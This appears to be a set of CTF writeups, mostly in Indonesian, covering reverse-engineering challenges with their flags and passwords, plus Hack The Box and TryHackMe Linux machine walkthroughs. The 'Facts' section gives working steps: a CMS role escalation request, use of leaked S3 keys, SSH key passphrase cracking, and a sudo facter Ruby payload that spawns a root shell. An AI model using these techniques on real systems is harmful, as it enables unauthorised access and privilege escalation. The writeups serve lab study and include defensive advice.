Mungkin program berhenti di sini.
Alur program rusak.
```

Padahal saat runtime, program tidak berhenti. Program sengaja menggunakan handler untuk melewati `UD2`.

Jadi bagi decompiler:

```text
Alurnya terlihat rusak.
```

Tapi bagi program saat dijalankan:

```text
Aman, karena SIGILL ditangkap.
```

Ini trik anti-decompilation.

---

# 11. Kenapa nama flag-nya `Itz_0nLy_UD2`?

Kalau dibaca gaya leetspeak:

```text
Itz_0nLy_UD2
```

Artinya:

```text
It's only UD2
```

Maksudnya:

```text
Ini cuma trik UD2 saja.
```

Jadi challenge ini sebenarnya mengajarkan:

```text
Decompiler terlihat bingung bukan karena logic-nya sangat kompleks,
tapi karena ada instruksi UD2 yang sengaja dipasang untuk mengacaukan analisis.
```

---

# 12. Flow final dalam bentuk pseudo-code

Kalau kita tulis ulang programnya dalam bentuk mudah, kira-kira seperti ini:

```c
int main(int argc, char **argv) {
    setup_SIGILL_handler();

    if (argc != 2) {
        return 1;
    }

    char *password = argv[1];

    if (strlen(password) != 12) {
        return 1;
    }

    if (strncmp(password, "Itz", 3) != 0) {
        return 1;
    }

    if (strncmp(password + 3, "_0n", 3) != 0) {
        return 1;
    }

    if (strncmp(password + 6, "Ly_", 3) != 0) {
        return 1;
    }

    if (strncmp(password + 9, "UD2", 3) != 0) {
        return 1;
    }

    printf("> HTB{%s}\n", password);
}
```

Dan handler `UD2` kira-kira seperti ini:

```c
void segill_sigaction(int signal, siginfo_t *info, void *context) {
    context->RIP += 2;
}
```

Artinya:

```text
Kalau ketemu UD2, lompat 2 byte ke depan.
```

---

# 13. Ringkasan cara berpikir detektifnya

Aku ambil langkah seperti ini karena setiap langkah menjawab pertanyaan tertentu:

| Langkah            | Pertanyaan yang dijawab                                    |
| ------------------ | ---------------------------------------------------------- |
| Ekstrak ZIP        | File challenge-nya apa?                                    |
| `file`             | Ini binary jenis apa? Linux? 64-bit? stripped?             |
| `strings`          | Ada teks/password/format flag yang kelihatan?              |
| `.rodata`          | String penting disimpan di mana?                           |
| Disassembly `main` | String itu benar dipakai untuk validasi atau cuma jebakan? |
| Analisis `strlen`  | Berapa panjang password?                                   |
| Analisis `strncmp` | Password dibandingkan dengan apa?                          |
| Analisis `UD2`     | Kenapa decompiler dibuat bingung?                          |
| Jalankan binary    | Validasi bahwa password benar-benar menghasilkan flag      |

Jadi bukan tebak-tebakan. Kita bergerak dari petunjuk paling mudah dulu, lalu membuktikannya lewat assembly.

Finalnya:

```text
Password: Itz_0nLy_UD2
Flag:     HTB{Itz_0nLy_UD2}
```

Berikut **pohon pertanyaan bercabang** yang bagus kamu miliki saat mengerjakan CTF Reverse Engineering. Anggap ini seperti peta berpikir agar tidak asal buka Ghidra lalu bingung.

---

# 1. Pertanyaan paling awal: “File ini sebenarnya apa?”

Sebelum mikir flag, tanya dulu:

```text
Ini file apa?
```

Lanjut bercabang:

```text
Apakah ini ELF / PE / Mach-O / APK / .NET / Java / Python compiled / firmware?
```

Kenapa penting?

Karena cara analisisnya beda.

Contoh:

```text
ELF Linux      -> file, checksec, strings, objdump, gdb, ltrace
PE Windows     -> Detect It Easy, PE-bear, x64dbg, dnSpy kalau .NET
APK Android    -> jadx, apktool
.NET           -> dnSpy, ILSpy
Java           -> jadx / fernflower / CFR
Python .pyc    -> uncompyle6 / pycdc
```

Pertanyaan turunannya:

```text
Apakah binary 32-bit atau 64-bit?
Apakah stripped atau tidak?
Apakah dynamically linked atau statically linked?
Apakah packed atau obfuscated?
```

Tujuannya bukan langsung mencari flag, tapi memilih **senjata yang tepat**.

---

# 2. Pertanyaan kedua: “Program ini minta input dari mana?”

Ini salah satu pertanyaan paling penting di reverse engineering.

```text
Program menerima data dari mana?
```

Bercabang:

```text
Apakah input dari argv?
Apakah input dari stdin?
Apakah input dari file?
Apakah input dari network?
Apakah input dari environment variable?
Apakah input hardcoded?
```

Contoh:

```bash
./challenge password
```

berarti kemungkinan input dari `argv`.

Kalau program menunggu kamu mengetik:

```text
Enter password:
```

berarti input dari `stdin`.

Kalau program membaca file:

```text
flag.txt
license.key
input.dat
```

berarti kita harus lihat fungsi seperti:

```c
fopen
read
fgets
scanf
recv
getenv
```

Pertanyaan praktis:

```text
Fungsi input apa yang dipakai?
scanf?
fgets?
read?
recv?
getchar?
argv[1]?
```

Kenapa ini penting?

Karena flag biasanya muncul setelah input benar. Jadi kita harus tahu **apa yang harus kita kendalikan**.

---

# 3. Pertanyaan ketiga: “Apa syarat input dianggap benar?”

Setelah tahu input dari mana, tanya:

```text
Program mengecek input dengan cara apa?
```

Bercabang:

```text
Apakah dicek panjangnya?
Apakah dibandingkan langsung?
Apakah di-hash?
Apakah di-XOR?
Apakah dienkripsi?
Apakah diacak urutannya?
Apakah dicek karakter per karakter?
Apakah dicek dengan operasi matematika?
```

Cari fungsi seperti:

```text
strlen
strcmp
strncmp
memcmp
strchr
atoi
md5
sha
AES
RC4
xor
base64
```

Contoh logika sederhana:

```c
if (strcmp(input, "secret") == 0) {
    print_flag();
}
```

Maka pertanyaannya:

```text
String pembandingnya apa?
```

Contoh logika menengah:

```c
if (strlen(input) != 32) fail();
```

Maka pertanyaannya:

```text
Panjang input harus berapa?
```

Contoh logika sulit:

```c
for i in range(len(input)):
    if ((input[i] ^ 0x37) != arr[i]) fail();
```

Maka pertanyaannya:

```text
Bisa tidak operasi ini dibalik?
```

Biasanya jawabannya: bisa.

---

# 4. Pertanyaan keempat: “Di mana cabang sukses dan gagal?”

Dalam binary, hampir selalu ada percabangan:

```text
Kalau benar -> lanjut / print flag
Kalau salah -> exit / wrong / nope
```

Tanya:

```text
Mana jalur sukses?
Mana jalur gagal?
Apa instruksi jump yang menentukan?
```

Cari string seperti:

```text
Correct
Wrong
Invalid
Try again
Access granted
HTB{
flag
```

Lalu lihat siapa yang memanggil string itu.

Pertanyaan bercabang:

```text
Apakah ada fungsi print_flag?
Apakah ada puts("Correct")?
Apakah ada printf("HTB{%s}")?
Apakah flag dicetak langsung?
Apakah flag dibangun dulu lalu dicetak?
```

Dalam assembly, perhatikan instruksi seperti:

```asm
cmp
test
je
jne
jg
jl
jz
jnz
call
```

Pertanyaan mentalnya:

```text
Nilai apa yang harus dibuat agar jump menuju jalur sukses?
```

Misalnya:

```asm
cmp eax, 0
jne fail
```

Artinya agar tidak gagal:

```text
eax harus 0
```

Kalau ini dari `strcmp`, berarti:

```text
strcmp harus menghasilkan 0
input harus sama dengan string pembanding
```

---

# 5. Pertanyaan kelima: “Apakah flag langsung ada di strings?”

Ini langkah murah tapi sangat sering berguna.

Tanya:

```text
Apakah flag atau password terlihat jelas?
```

Coba:

```bash
strings -a ./challenge
```

Cari:

```text
HTB{
flag
password
correct
wrong
admin
secret
key
```

Bercabang:

```text
Kalau flag langsung muncul -> coba validasi
Kalau cuma potongan muncul -> cari cara menyusunnya
Kalau tidak muncul -> flag mungkin dihitung saat runtime
Kalau strings aneh semua -> mungkin packed/encrypted/obfuscated
```

Contoh dari challenge sebelumnya:

```text
Itz
_0n
Ly_
UD2
```

Pertanyaan yang benar adalah:

```text
Apakah potongan-potongan ini dipakai dalam pengecekan?
Urutannya bagaimana?
Apakah digabung?
```

Jangan langsung percaya strings. Jadikan itu **petunjuk**, bukan bukti final.

---

# 6. Pertanyaan keenam: “Apakah program memakai trik anti-reversing?”

CTF Reverse sering punya jebakan.

Tanya:

```text
Apakah program sengaja membuat analisis sulit?
```

Bercabang:

```text
Apakah binary packed?
Apakah memakai anti-debug?
Apakah memakai ptrace?
Apakah memakai timing check?
Apakah memakai signal handler?
Apakah ada instruksi illegal seperti UD2?
Apakah control flow-nya dibuat kacau?
Apakah string dienkripsi?
```

Cari tanda-tanda seperti:

```text
ptrace
signal
sigaction
SIGILL
SIGSEGV
mprotect
VirtualProtect
IsDebuggerPresent
rdtsc
sleep
fork
clone
```

Contoh pertanyaan yang bagus:

```text
Kalau program crash, apakah crash itu memang bug atau sengaja?
```

Dalam challenge tadi, `UD2` kelihatan seperti crash, tapi ternyata sengaja dipakai untuk membingungkan decompiler.

Pertanyaan lanjutannya:

```text
Apakah ada handler yang menangkap sinyal itu?
Kalau ada, handler mengubah apa?
RIP?
RSP?
Register lain?
```

---

# 7. Pertanyaan ketujuh: “Static analysis cukup, atau perlu dynamic analysis?”

Static analysis artinya membaca binary tanpa menjalankannya.

Dynamic analysis artinya menjalankan dan mengamati perilakunya.

Tanya:

```text
Apakah cukup membaca kode?
```

Bercabang:

```text
Kalau logikanya jelas -> static cukup
Kalau value berubah saat runtime -> pakai debugger
Kalau string didecrypt saat runtime -> pakai debugger
Kalau ada anti-debug -> perlu bypass
Kalau input rumit -> trace perbandingan
```

Tools static:

```text
strings
file
checksec
objdump
readelf
Ghidra
IDA
Binary Ninja
radare2
```

Tools dynamic:

```text
gdb
pwndbg
gef
ltrace
strace
x64dbg
frida
qemu
```

Pertanyaan saat debugging:

```text
Di mana fungsi compare dipanggil?
Apa isi register sebelum strcmp?
Apa string pembandingnya?
Apa isi buffer setelah transformasi?
Di mana program lompat ke fail?
```

---

# 8. Pertanyaan kedelapan: “Apakah validasi bisa dibalik?”

Banyak challenge Reverse tidak perlu brute force. Kita cukup membalik logikanya.

Tanya:

```text
Operasi terhadap input bisa dibalik tidak?
```

Contoh operasi yang mudah dibalik:

```text
XOR
ADD
SUB
ROT
Caesar shift
Base64
Reverse string
Swap index
```

Misalnya:

```c
output[i] = input[i] ^ 0x55;
```

Untuk membalik:

```c
input[i] = output[i] ^ 0x55;
```

Karena XOR dengan nilai yang sama akan balik lagi.

Pertanyaan bercabang:

```text
Apakah ada array target?
Apakah input diubah lalu dibandingkan?
Apakah transformasinya per karakter?
Apakah tiap karakter independen?
Apakah ada dependency antar karakter?
```

Kalau tiap karakter independen, gampang:

```text
Selesaikan satu per satu.
```

Kalau saling bergantung:

```text
Butuh symbolic execution, Z3, atau analisis manual lebih dalam.
```

---

# 9. Pertanyaan kesembilan: “Apakah lebih cepat patch daripada solve?”

Kadang kita tidak perlu tahu password. Kita bisa patch binary agar selalu masuk jalur sukses.

Tanya:

```text
Apakah flag dicetak oleh program setelah validasi?
```

Bercabang:

```text
Kalau flag sudah ada di program -> bisa patch jump ke jalur sukses
Kalau flag dibangun dari input -> tetap butuh input benar
Kalau flag didecrypt memakai password -> patch saja tidak cukup
```

Contoh:

```asm
jne fail
```

Bisa dipatch menjadi:

```asm
je fail
```

atau diganti NOP.

Tapi hati-hati:

```text
Patch hanya membantu kalau flag tidak bergantung pada password.
```

Dalam challenge sebelumnya, output adalah:

```c
printf("HTB{%s}", input);
```

Berarti kalau kita patch tanpa tahu input benar, hasilnya bisa salah.

Jadi pertanyaan penting:

```text
Apakah input hanya kunci validasi, atau input adalah bagian dari flag?
```

Kalau input adalah bagian dari flag, kita tetap harus menemukan input yang benar.

---

# 10. Pertanyaan kesepuluh: “Apakah bisa dibuat script solver?”

Kalau validasinya panjang, jangan selesaikan manual.

Tanya:

```text
Bisakah logika program ditulis ulang ke Python?
```

Bercabang:

```text
Apakah validasi berupa persamaan?
Apakah cocok untuk brute force kecil?
Apakah cocok untuk Z3?
Apakah cocok untuk angr?
Apakah cocok untuk emulation?
```

Gunakan script kalau:

```text
Banyak karakter harus ditebak
Ada banyak constraint matematika
Ada array panjang
Ada operasi bitwise berulang
```

Contoh mental model:

```text
Daripada menjalankan program 1000 kali secara manual,
lebih baik tulis solver yang mencoba kandidat dan mengecek constraint.
```

---

# 11. Pohon keputusan praktis saat mulai challenge

Ini versi ringkas yang bisa kamu pakai setiap kali mulai CTF Reverse:

```text
Mulai
 |
 |-- 1. File ini tipe apa?
 |       |
 |       |-- ELF? PE? APK? .NET? Java? Python?
 |
 |-- 2. Program menerima input dari mana?
 |       |
 |       |-- argv?
 |       |-- stdin?
 |       |-- file?
 |       |-- network?
 |
 |-- 3. Ada string menarik?
 |       |
 |       |-- Ada HTB{?
 |       |-- Ada password?
 |       |-- Ada correct/wrong?
 |       |-- Ada potongan mencurigakan?
 |
 |-- 4. Di mana validasi input?
 |       |
 |       |-- strcmp/strncmp?
 |       |-- strlen?
 |       |-- memcmp?
 |       |-- loop karakter?
 |       |-- hash/encrypt?
 |
 |-- 5. Apa syarat sukses?
 |       |
 |       |-- Panjang berapa?
 |       |-- Karakter apa di posisi tertentu?
 |       |-- Hasil transformasi harus sama dengan apa?
 |
 |-- 6. Apakah ada anti-reversing?
 |       |
 |       |-- packed?
 |       |-- anti-debug?
 |       |-- signal handler?
 |       |-- illegal instruction?
 |       |-- encrypted strings?
 |
 |-- 7. Bisa diselesaikan static?
 |       |
 |       |-- Ya -> baca logic dan balikkan
 |       |-- Tidak -> pakai debugger
 |
 |-- 8. Apakah input adalah flag?
 |       |
 |       |-- Ya -> cari input valid
 |       |-- Tidak -> mungkin bisa patch jalur sukses
 |
 |-- 9. Validasi bisa dibalik?
 |       |
 |       |-- Ya -> buat solver/manual reverse
 |       |-- Tidak mudah -> pakai brute force/Z3/angr
 |
 |-- 10. Jalankan dan validasi
         |
         |-- Output HTB{...}
```

---

# 12. Pertanyaan “emas” yang harus sering kamu ulang

Kalau sedang stuck, ulangi pertanyaan ini:

```text
Apa yang program mau dari input saya?
```

Lalu:

```text
Siapa yang mengecek input?
Apa yang dibandingkan?
Nilai benar itu apa?
Kalau salah, lompat ke mana?
Kalau benar, lompat ke mana?
Data rahasia muncul sebelum atau sesudah validasi?
Apakah string rahasia sudah ada, atau dibuat saat runtime?
Apakah saya bisa melihat nilainya di memory?
Apakah saya bisa berhenti tepat sebelum compare?
```

Ini pertanyaan yang sangat kuat.

Dalam banyak challenge, jawabannya cukup:

```text
Break sebelum strcmp, lihat argumennya.
```

Atau:

```text
Lihat array target, balikkan XOR-nya.
```

---

# 13. Mindset penting

Reverse engineering bukan menghafal tool.

Reverse engineering adalah bertanya:

```text
Program ini membuat keputusan berdasarkan apa?
```

Kalau kamu tahu keputusan dibuat berdasarkan apa, kamu bisa mengontrol hasilnya.

Untuk challenge seperti yang tadi:

```text
Program membuat keputusan berdasarkan:
1. jumlah argumen
2. panjang password
3. empat potongan strncmp
```

Maka kita tinggal menjawab:

```text
Argumen harus ada satu.
Panjang harus 12.
Isi harus Itz + _0n + Ly_ + UD2.
```

Maka flag didapat:

```text
HTB{Itz_0nLy_UD2}
```

Itulah inti reverse engineering CTF: **temukan aturan main program, lalu buat input yang memenuhi aturan itu.**


## CHAT 10
Aman, ini tipikal **CTF reverse engineering beginner/easy**: binary hanya ngecek password, dan string penting belum di-obfuscate.

Flag-nya:

```text
HTB{un0bfu5c4t3d_5tr1ng5}
```

Langkah yang saya ambil:

### 1. Cek isi ZIP

ZIP memakai password `hackthebox`, lalu isinya satu binary:

```bash
unzip -P hackthebox SpookyPass.zip
cd rev_spookypass
file pass
```

Hasilnya:

```text
pass: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Artinya ini program Linux 64-bit. Karena **not stripped**, simbol dan informasi debugging dasar masih cukup mudah dianalisis.

### 2. Jalankan binary dulu

```bash
chmod +x pass
./pass
```

Output-nya meminta password:

```text
Welcome to the SPOOKIEST party of the year.
Before we let you in, you'll need to give us the password:
```

Kalau input salah:

```text
You're not a real ghost; clear off!
```

Jadi ini kemungkinan besar program melakukan `strcmp()` terhadap password hardcoded.

### 3. Cek string yang tertanam di binary

Untuk challenge mudah, langkah paling cepat adalah pakai `strings`:

```bash
strings -a pass
```

Di output kelihatan string penting:

```text
s3cr3t_p455_f0r_gh05t5_4nd_gh0ul5
Welcome inside!
You're not a real ghost; clear off!
```

Kenapa saya ambil langkah ini? Karena kalau password disimpan plaintext di binary, `strings` langsung bisa menampilkan string ASCII yang tertanam di `.rodata`.

### 4. Masukkan password

```bash
./pass
```

Masukkan:

```text
s3cr3t_p455_f0r_gh05t5_4nd_gh0ul5
```

Output:

```text
Welcome inside!
HTB{un0bfu5c4t3d_5tr1ng5}
```

Jadi flag final:

```text
HTB{un0bfu5c4t3d_5tr1ng5}
```

Inti pembelajarannya: sebelum buka Ghidra/radare2/gdb, selalu lakukan triage cepat dulu: `file`, jalankan program, lalu `strings`. Untuk challenge “very easy”, sering kali password atau flag masih tersimpan plaintext.

## CHAT 11
# Hack The Box - Facts Writeup

**Machine:** Facts  
**Platform:** Hack The Box  
**Difficulty:** Easy  
**Operating System:** Linux  
**Target IP:** `10.129.29.85`  
**Domain:** `facts.htb`  
**Primary Attack Path:** Camaleon CMS authenticated privilege escalation -> S3 credential exposure -> SSH key recovery -> local sudo misconfiguration in `facter`

---

## Executive Summary

The machine **Facts** exposed a small external attack surface consisting of SSH and an HTTP web application. Initial web enumeration revealed a Camaleon CMS deployment at `facts.htb`, including an accessible administrative login interface. After registering a low-privileged account, the CMS version was identified as **Camaleon CMS 2.9.0**.

The initial access path relied on authenticated weaknesses in Camaleon CMS. A low-privileged account was escalated to an administrative CMS role through a mass-assignment style profile/password update issue. Once administrative access was obtained, the site settings exposed S3-compatible storage credentials and an internal object storage endpoint. Those credentials were used to enumerate the storage backend and retrieve a protected SSH private key.

The SSH private key was encrypted, so it was converted to a John the Ripper-compatible hash and cracked with a wordlist. The recovered passphrase allowed SSH access as the Linux user `trivia`. From there, local enumeration showed access to `william`'s user flag and a sudo permission allowing `trivia` to run `/usr/bin/facter` as root. Because `facter` can load custom Ruby facts from a user-controlled directory, running it with sudo enabled Ruby code execution as root, resulting in a root shell.

High-level chain:

```text
Recon -> Web Enumeration -> Camaleon CMS 2.9.0
-> Authenticated CMS privilege escalation
-> S3 settings disclosure
-> Object storage enumeration
-> Encrypted SSH key recovery
-> SSH as trivia
-> Read user.txt from william
-> sudo facter custom Ruby fact
-> root shell
```

![Room Detail](roomdetail.png)

---

## Enumeration

### Port Scanning

The first step was to identify exposed services on the target. A standard Nmap scan showed that only SSH and HTTP were open:

```bash
sudo nmap -sS -sV -sC --reason -oN initial.txt 10.129.29.85
```

Observed services:

| Port | Service | Version / Notes |
|---:|---|---|
| 22/tcp | SSH | OpenSSH 9.9p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.26.3, redirects to `http://facts.htb/` |

The HTTP service redirected by hostname, so the local hosts file was updated:

```bash
echo "10.129.29.85 facts.htb" | sudo tee -a /etc/hosts
```

![Nmap Scan](recon.png)

### Web Discovery

After resolving `facts.htb`, the site presented a trivia-themed web application. Directory enumeration discovered several routes, with `/admin` redirecting to the CMS login panel:

```bash
gobuster dir \
  -u http://facts.htb/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -x php,txt,html,js,json,bak \
  -t 20 \
  -o gobuster-common.txt
```

Important discovery:

```text
/admin      -> http://facts.htb/admin/login
```

![Directory Enumeration](enumeration.png)

### CMS Fingerprinting

The admin panel revealed the application as **Camaleon CMS 2.9.0**. The version was visible in the CMS interface footer after login.

![Admin Login](webdetail3.png)

![Admin Dashboard](webdetail4.png)

![Camaleon CMS Version](webdetail.png)

At this point, the machine moved from generic web enumeration into authenticated CMS testing. A normal low-privileged user account could be created and used to log in to the CMS dashboard with a `client` role.

---

## Initial Access

### Vulnerability Context

Two Camaleon CMS issues were relevant during analysis:

1. **Authenticated privilege escalation via mass assignment**  
   The CMS user update flow accepted sensitive fields that should not have been user-controllable. In particular, the profile/password update endpoint accepted a role parameter, allowing a low-privileged user to change their own CMS role.

2. **Authenticated path traversal in the AWS S3 uploader flow**  
   Camaleon CMS versions in the affected range contained a path traversal issue in the `download_private_file` functionality when the AWS S3 uploader backend was used. This allowed authenticated users to request arbitrary files through traversal sequences in the `file` parameter.

In this machine, the practical exploitation path used an authenticated CMS privilege escalation script to become an admin user, then extracted the configured S3 storage values from the CMS settings page.

### CMS Role Escalation

The provided exploit script performed the following workflow:

1. Start an HTTP session.
2. Fetch `/admin/login`.
3. Extract the Rails `authenticity_token`.
4. Submit valid low-privileged CMS credentials.
5. Visit `/admin/profile/edit`.
6. Extract the user ID and current role.
7. Send a crafted update request to:

```text
/admin/users/<USER_ID>/updated_ajax
```

8. Include the sensitive role field:

```text
password[role]=admin
```

9. Verify that the current user role changed from `client` to `admin`.
10. Optionally extract S3 configuration from `/admin/settings/site`.
11. Revert the user role back to `client` for cleanup.

Example usage with placeholders:

```bash
python3 exploit.py \
  -u http://facts.htb \
  -U '<CMS_USERNAME>' \
  -P '<CMS_PASSWORD>' \
  -e \
  -r
```

The `-e` flag extracted S3-related configuration, and the `-r` flag reverted the CMS role after extraction.

![Exploit Execution](exploit2.png)

### Why This Worked

The core issue was broken authorization at the object update layer. A regular user should only be allowed to change safe fields such as their password. Instead, the update mechanism accepted an additional role field from the client-controlled request body.

A secure implementation should explicitly allow only expected profile/password fields. In this case, the backend accepted too much input from the request and allowed a low-privileged user to modify a privileged attribute.

Conceptually:

```text
Expected safe fields:
- password[password]
- password[password_confirmation]

Unsafe field accepted:
- password[role]=admin
```

This is a classic example of mass assignment: client-supplied parameters are trusted too broadly and applied to server-side user objects without strict field-level authorization.

### S3 Credential Exposure

After CMS admin access was obtained, the site settings page exposed S3-compatible storage configuration values:

```text
S3 Access Key: [REDACTED]
S3 Secret Key: [REDACTED]
S3 Endpoint:   [REDACTED]
```

![S3 Configuration](inputkey.png)

The AWS CLI was configured with a dedicated profile:

```bash
aws configure --profile facts
```

The recovered values were then used against the lab's S3-compatible endpoint:

```bash
aws --profile facts --endpoint-url http://<S3_ENDPOINT> s3 ls
aws --profile facts --endpoint-url http://<S3_ENDPOINT> s3 ls s3://<BUCKET_NAME>
aws --profile facts --endpoint-url http://<S3_ENDPOINT> s3 cp s3://<BUCKET_NAME>/<OBJECT> ./<OBJECT>
```

The object storage contained an encrypted SSH private key. It was downloaded locally for offline analysis.

---

## SSH Key Cracking

The private key required a passphrase, so it was converted into a John the Ripper-compatible format:

```bash
ssh2john id_rsa > id.hash
```

Then John the Ripper was used with `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt id.hash
```

Recovered passphrase:

```text
dragonballz
```

![SSH Key Cracking](cracking.png)

With the passphrase recovered, the SSH key permissions were corrected and SSH access was established as `trivia`:

```bash
chmod 600 id_rsa
ssh -i id_rsa trivia@facts.htb
```

This produced the initial Linux foothold.

---

## Lateral Movement

After logging in as `trivia`, local enumeration confirmed the current identity and home directory:

```bash
whoami
pwd
ls -la
```

The machine contained at least two non-root users:

```text
trivia
william
```

The `william` home directory was accessible enough to retrieve the user flag:

```bash
cd /home/william
ls -la
cat user.txt
```

The flag value is intentionally omitted from this public writeup.

![User Flag](userflag.png)

This stage demonstrates an important lateral movement lesson: even without fully switching users, weak file permissions or group relationships may expose another user's sensitive files.

---

## Privilege Escalation

### Sudo Enumeration

The next step was to inspect sudo privileges for the `trivia` user:

```bash
sudo -l
```

The key finding was permission to run `facter` as root:

```text
/usr/bin/facter
```

![Privilege Escalation Discovery](previllage_escalation.png)

### Deep Dive: Why the Facter Exploit Works

`facter` is a system inventory tool commonly used with Puppet. It collects system facts such as hostname, operating system, interfaces, uptime, virtualization type, and other host metadata.

A powerful feature of `facter` is support for **custom facts**. Custom facts are user-defined Ruby files that Facter can load from a specified directory. The relevant option is:

```bash
facter --custom-dir <DIRECTORY>
```

When this command is run normally as a low-privileged user, a malicious custom fact only executes with that user's permissions. The problem on this machine was the sudo rule: `trivia` could run `facter` as root.

That changes the trust boundary:

```text
User-controlled Ruby file
        +
sudo-executed facter process
        =
Ruby code execution as root
```

The attacker-controlled Ruby file was placed in a writable directory, for example `/home/trivia/kopi_hitam.rb`:

```ruby
Facter.add(:kopi_hitam) do
  setcode do
    exec "/bin/bash -p"
  end
end
```

Then `facter` was executed with sudo while pointing to the custom directory:

```bash
sudo facter --custom-dir /home/trivia kopi_hitam
```

Because Facter was running under sudo, it loaded and evaluated the custom Ruby fact with root privileges. The Ruby `exec` call replaced the Facter process with `/bin/bash -p`.

The `-p` flag is important because it tells Bash to preserve the effective UID instead of dropping privileges. Since the effective UID came from the sudo-run process, the resulting shell remained privileged.

Successful result:

```bash
whoami
# root
```

![Root via Facter](rootflag.png)

### Root Flag

After obtaining a root shell, the root flag was read from `/root/root.txt`:

```bash
cd /root
cat root.txt
```

The flag value is omitted from this public writeup.

---

## Defensive Insight

### 1. Enforce Field-Level Authorization

The CMS privilege escalation occurred because sensitive user attributes were accepted from a client-controlled request. Applications should never trust request parameters for authorization-sensitive fields such as `role`, `is_admin`, `permissions`, or `group_id`.

Recommended controls:

- Use strict parameter allowlists.
- Do not use broad parameter permitting for user update actions.
- Separate password update logic from role-management logic.
- Require server-side authorization checks before role changes.

### 2. Protect Secrets with Proper Secret Management

The S3 access and secret keys were accessible through the CMS settings after role escalation. Administrative settings often become high-value targets after web compromise.

Recommended controls:

- Store cloud credentials in a dedicated secret manager.
- Avoid exposing raw secrets in web UI fields after initial save.
- Use short-lived credentials where possible.
- Rotate credentials after suspected exposure.
- Apply least-privilege IAM policies to storage keys.

### 3. Harden Object Storage Access

The object storage contained an SSH private key, which created a direct bridge from web compromise to host access.

Recommended controls:

- Do not store SSH private keys in application buckets.
- Separate application media storage from administrative backup storage.
- Use bucket policies that restrict object listing and retrieval.
- Enable object access logging and alert on unusual access patterns.

### 4. Restrict Sudo Rules for Scriptable Programs

Allowing a user to run `facter` as root is dangerous because it supports loading custom Ruby code. Any sudo-allowed binary that can load plugins, scripts, modules, libraries, or configuration from user-controlled paths should be treated as code execution.

Recommended controls:

- Avoid sudo permissions for interpreters or plugin-capable tools.
- If a tool must be allowed, restrict dangerous arguments such as `--custom-dir`.
- Use full command argument restrictions in sudoers.
- Audit allowed binaries with resources such as GTFOBins and vendor documentation.

---

## Conclusion

The Facts machine demonstrated a realistic multi-stage compromise path:

1. Minimal external exposure did not prevent compromise because the web application was vulnerable.
2. Authenticated CMS functionality allowed a low-privileged account to become an administrator.
3. CMS configuration exposed cloud storage credentials.
4. Cloud storage contained an encrypted SSH private key.
5. Offline cracking recovered the key passphrase.
6. SSH access as `trivia` led to local enumeration.
7. A dangerous sudo rule for `facter` allowed Ruby custom fact execution as root.

The key lesson is that privilege boundaries must be enforced consistently across the entire stack. Web roles, cloud credentials, object storage, SSH keys, local file permissions, and sudo rules are all part of the same security chain. A weakness in any one layer can become a stepping stone toward full system compromise.

## CHAT 12
# TryHackMe — Break Out The Cage Writeup

> **Safe English Version**  
> This writeup is written for a private TryHackMe CTF lab. The goal is education: Linux enumeration, clue analysis, permission review, and understanding root cause. Sensitive values such as passwords and flags are intentionally shown as `<REDACTED>` so the writeup remains safe to share.

---

## TL;DR Flow

Think of the target machine like a funny little house:

- **Web** = the living room. Looks interesting, but mostly decoration.
- **FTP** = the backyard storage room. It was accidentally left open with anonymous login.
- **SSH** = the bedroom door. It needs a password.
- **Broadcast quotes** = an automated speaker that reads notes from a file.
- **Email backup** = the final drawer full of clues.

Final route:

```text
Nmap recon
  ↓
Anonymous FTP → dad_tasks
  ↓
Base64 decode + Vigenere key: namelesstwo
  ↓
Weston's password
  ↓
SSH as weston
  ↓
Find the automated quote broadcaster
  ↓
Command injection via writable .quotes file
  ↓
Pivot to user cage using SSH key access
  ↓
Read Super_Duper_Checklist → user flag
  ↓
Read email_backup
  ↓
Vigenere decode note with key: face
  ↓
Root password
  ↓
su - root
  ↓
Read root email_backup → root flag
```

---

## Important Visual References

Only the useful screenshots are included. Images containing final unredacted passwords or flags were avoided or redacted.

### 1. Room Overview

![TryHackMe room overview](./tuwalk_assets/01_room_overview.png)

### 2. Static Nicholas Cage Web Page

![Static Nicholas Cage web page](./tuwalk_assets/02_static_web.png)

### 3. Recon and Anonymous FTP Clue

![Nmap and FTP anonymous clue](./tuwalk_assets/03_recon_ftp.png)

### 4. Decoding `dad_tasks` in CyberChef

![CyberChef Weston password redacted](./tuwalk_assets/04_cyberchef_weston_redacted.png)

### 5. Quote Script Root Cause

![Unsafe quote script](./tuwalk_assets/05_quote_script_rootcause.png)

### 6. Stable SSH Access as `cage`

![SSH login as cage](./tuwalk_assets/06_cage_ssh_login.png)

### 7. User Flag Location, Redacted

![User flag redacted](./tuwalk_assets/07_user_flag_redacted.png)

### 8. Email Clue for Root Stage

![Email clue with Vigenere note](./tuwalk_assets/08_email_face_clue.png)

### 9. Vigenere Decode with Key `face`, Sensitive Output Redacted

![CyberChef face key redacted](./tuwalk_assets/09_cyberchef_face_redacted.png)

### 10. Root Email Proof, Flag Redacted

![Root email redacted](./tuwalk_assets/10_root_email_redacted.png)

---

# 1. Recon: Finding the Doors

The first step was service discovery.

```bash
nmap -sC -sV <TARGET_IP>
```

Important results:

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

Simple interpretation:

| Port | Everyday Analogy | Action |
|---|---|---|
| 80 HTTP | Living room / website | Check the page |
| 21 FTP | Storage room | Check anonymous login |
| 22 SSH | Locked bedroom door | Needs credentials |

The web page looked fun, but it was static. There was no login form, no obvious dynamic endpoint, and nothing interactive enough to become the main route.

**Checkpoint:** do not get stuck staring at the website. The bigger clue is that FTP allows anonymous access.

---

# 2. Anonymous FTP: The Open Storage Room

Login to FTP:

```bash
ftp <TARGET_IP>
```

Use:

```text
username: anonymous
password: anonymous
```

Then list and download the available file:

```ftp
ls
get dad_tasks
bye
```

The interesting file was:

```text
dad_tasks
```

At first, the content looked like a long encoded string. In CTF language, this usually means: “this is not broken; it is a puzzle.”

---

# 3. Decoding `dad_tasks`: A Two-Layer Gift Box

The `dad_tasks` file had two layers:

```text
Layer 1: Base64
Layer 2: Vigenere cipher
```

In CyberChef, use this recipe:

```text
From Base64
Vigenere Decode
Key: namelesstwo
```

The decoded output reveals Weston's SSH password.

> Safe note: the real password is not written here. Keep it in your private lab notes or enter it directly into TryHackMe.

---

